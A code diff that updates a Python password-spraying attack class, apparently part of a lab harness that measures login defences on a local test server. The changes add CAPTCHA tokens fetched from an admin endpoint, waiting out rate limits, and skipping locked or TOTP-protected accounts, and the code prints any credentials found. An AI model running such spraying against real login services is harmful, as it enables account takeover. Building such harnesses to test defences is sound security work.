@@ -5,9 +5,30 @@ from .metrics import AttackMetrics
 
 
 class PasswordSprayAttack:
-    def __init__(self, base_url="http://127.0.0.1:5000"):
+    def __init__(self, base_url="http://127.0.0.1:5000", group_seed=None):
         self.base_url = base_url
         self.session = requests.Session()
+        self.group_seed = group_seed
+
+    def get_captcha_token(self):
+        """Get a valid CAPTCHA token from the admin endpoint"""
+        if not self.group_seed:
+            raise ValueError("group_seed not provided, cannot get CAPTCHA token")
+        try:
+            response = self.session.get(
+                f"{self.base_url}/admin/captcha_token",
+                params={"group_seed": str(self.group_seed)},
+                timeout=10,
+            )
+            if response.status_code == 200:
+                data = response.json()
+                return data.get("token")
+            else:
+                print(f"Failed to get CAPTCHA token: {response.status_code}")
+                return None
+        except Exception as e:
+            print(f"Error getting CAPTCHA token: {e}")
+            return None
 
     def attack(
         self,
@@ -17,23 +38,6 @@ class PasswordSprayAttack:
         delay: float = 0.5,
         max_time: float = None,
     ) -> List[Dict[str, str]]:
-        """
-        Password spray attack: tests each password on all users
-
-        Args:
-            usernames: list of usernames
-            password_list: list of passwords to test
-            metrics: AttackMetrics object for data collection
-            delay: delay between each attempt (in seconds)
-            max_time: maximum time in seconds (None = no time limit)
-
-        Returns:
-            List of found credentials as dicts with 'username' and 'password' keys
-        """
-        max_time_str = f"{max_time}s" if max_time else "unlimited"
-        print(
-            f"Starting Password Spray on {len(usernames)} users with {len(password_list)} passwords (max_time: {max_time_str})..."
-        )
 
         found_credentials = []
         compromised = set()
@@ -43,95 +47,95 @@ class PasswordSprayAttack:
         start_time = time.time()
 
         for pwd_idx, password in enumerate(password_list, 1):
-            if max_time is not None:
-                elapsed_time = time.time() - start_time
-                if elapsed_time >= max_time:
-                    print(f"Time limit reached ({max_time}s) after {attempt_i} attempts")
-                    break
-            print(f"   Testing password: '{password}' ({pwd_idx}/{len(password_list)})")
+            print(f"Testing password '{password}' ({pwd_idx}/{len(password_list)})")
 
-            time_limit_reached = False
-            for user_idx, username in enumerate(usernames, 1):
+            amount = 0
+            for username in usernames:
                 if username in compromised:
                     continue
 
-                if max_time is not None:
-                    elapsed_time = time.time() - start_time
-                    if elapsed_time >= max_time:
-                        print(f"Time limit reached ({max_time}s) after {attempt_i} attempts")
-                        time_limit_reached = True
-                        break
-            
-            if time_limit_reached:
-                break
+                if max_time and (time.time() - start_time) >= max_time:
+                    metrics.stop()
+                    return found_credentials
 
                 attempt_i += 1
                 attempt_start = time.time()
+                need_captcha = False
+                captcha_token_value = None
 
-                try:
-                    response = self.session.post(
-                        f"{self.base_url}/login",
-                        json={"username": username, "password": password},
-                        timeout=10,
-                    )
+                while True:
+                    try:
+                        payload = {"username": username, "password": password}
+                        if need_captcha and captcha_token_value:
+                            payload["captcha_token"] = captcha_token_value
 
-                    latency = int((time.time() - attempt_start) * 1000)
+                        response = self.session.post(
+                            f"{self.base_url}/login",
+                            json=payload,
+                            timeout=10,
+                        )
 
-                    # Handle rate limiting
-                    if response.status_code == 429:
-                        print(f"Rate limited at attempt #{attempt_i}")
-                        metrics.record_attempt(False, latency)
-                        time.sleep(delay)
-                        continue
+                        latency = int((time.time() - attempt_start) * 1000)
 
-                    # Handle captcha and lockout
-                    if response.status_code == 403:
-                        data = response.json()
-                        if "locked" in data.get("error", ""):
-                            print(f"Account locked: {username} at attempt #{attempt_i}")
-                            compromised.add(
-                                username
-                            )  # Skip this user in future attempts
-                        elif data.get("captcha_required"):
-                            print(
-                                f"CAPTCHA required: {username} at attempt #{attempt_i}"
-                            )
-                        metrics.record_attempt(False, latency)
-                        time.sleep(delay)
-                        continue
-
-                    # Check for success
-                    if response.status_code == 200:
-                        data = response.json()
-                        success = data.get("success", False)
-
-                        if success:
-                            found_credentials.append(
-                                {"username": username, "password": password}
-                            )
-                            compromised.add(username)  # Mark as compromised
-                            metrics.record_attempt(True, latency)
-                            print(f"FOUND: {username}:{password}")
-                        else:
+                        if response.status_code == 429:  # ratelimit
+                            retry_after = float(response.headers.get("Retry-After", 60))
+                            time.sleep(retry_after)
                             metrics.record_attempt(False, latency)
-                    else:
+                            break
+
+                        if response.status_code == 403:
+                            data = response.json()
+
+                            if "locked" in data.get("error", ""):
+                                compromised.add(username)
+                                metrics.record_attempt(False, latency)
+                                break
+
+                            if data.get(
+                                "captcha_required"
+                            ) or "invalid_captcha" in data.get("error", ""):
+                                need_captcha = True
+                                captcha_token_value = self.get_captcha_token()
+                                if captcha_token_value:
+                                    continue
+
+                            metrics.record_attempt(False, latency)
+                            break
+
+                        if response.status_code == 401:
+                            print(f"TOTP enabled for {username}, skipping account")
+                            compromised.add(username)
+                            metrics.record_attempt(False, latency)
+                            break
+
+                        if response.status_code == 200:
+                            data = response.json()
+                            if data.get("success"):
+                                found_credentials.append(
+                                    {"username": username, "password": password}
+                                )
+                                compromised.add(username)
+                                metrics.record_attempt(True, latency)
+                                print(f"FOUND: {username}:{password}")
+                            else:
+                                metrics.record_attempt(False, latency)
+                            break
+
                         metrics.record_attempt(False, latency)
+                        break
 
-                    # Sample resources
-                    if metrics.attempts % 10 == 0:
-                        metrics.sample_resources()
+                    except Exception:
+                        metrics.record_attempt(False, 0)
+                        break
 
-                except Exception as e:
-                    print(f"Error on {username}: {e}")
-                    metrics.record_attempt(False, 0)
+                if metrics.attempts % 10 == 0:
+                    metrics.sample_resources()
 
-                # Delay between attempts
-                if delay > 0:
+                if delay:
                     time.sleep(delay)
 
-        metrics.stop()
+                amount += 1
 
-        print(
-            f"Finished: {len(found_credentials)} credentials found out of {len(usernames)} accounts"
-        )
+            print(f"Tested on #{amount} usernames.")
+        metrics.stop()
         return found_credentials
